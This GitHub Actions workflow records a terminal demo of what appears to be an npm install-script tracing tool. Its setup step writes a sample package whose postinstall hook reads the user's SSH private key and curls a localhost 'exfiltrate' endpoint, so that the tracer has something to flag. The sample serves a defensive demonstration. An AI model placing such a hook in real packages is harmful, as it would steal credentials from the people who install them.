name: Generate Demo
on: workflow_dispatch
jobs:
  demo:
    runs-on: ubuntu-24.04
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-node@v4
        with:
          node-version: 20
      - name: Install dependencies
        run: |
          sudo apt-get update
          sudo apt-get install -y strace asciinema curl
          npm install
      - name: Setup demo
        run: |
          mkdir -p node_modules/demo-pkg
          cat << 'EOF' > node_modules/demo-pkg/package.json
          {
            "name": "demo-pkg",
            "version": "1.0.0",
            "scripts": {
              "postinstall": "cat ~/.ssh/id_rsa > /dev/null 2>&1; curl -s http://127.0.0.1:9999/exfiltrate > /dev/null 2>&1 || true"
            }
          }
          EOF
          
          # Pre-generate the report
          node bin/trace-npm.js run --package demo-pkg --script postinstall --i-understand-this-executes-untrusted-code --brief > pre_report.txt || true
          
          cat << 'EOF' > demo.sh
          #!/bin/bash
          export PS1="\$ "
          
          # Start dummy listener
          node -e 'require("net").createServer(s=>{s.on("data",()=>{});s.end()}).listen(9999,"127.0.0.1")' &
          
          # Start with report already on screen
          clear
          cat pre_report.txt
          echo -n "\$ "
          sleep 3
          
          # Now run the normal sequence
          clear
          echo -n "\$ "
          sleep 1
          echo "cat node_modules/demo-pkg/package.json"
          sleep 1
          cat node_modules/demo-pkg/package.json
          echo ""
          sleep 2
          echo -n "\$ "
          sleep 1
          echo "npx trace-npm run --package demo-pkg --script postinstall --i-understand-this-executes-untrusted-code --brief"
          sleep 1.5
          node bin/trace-npm.js run --package demo-pkg --script postinstall --i-understand-this-executes-untrusted-code --brief || true
          sleep 6
          echo -n " "
          EOF
      - name: Record and Upload Asciinema
        run: |
          asciinema rec --cols 100 --rows 45 demo.cast -c "bash demo.sh"
      - name: Upload Cast Artifact
        uses: actions/upload-artifact@v4
        with:
          name: asciinema-cast
          path: demo.cast
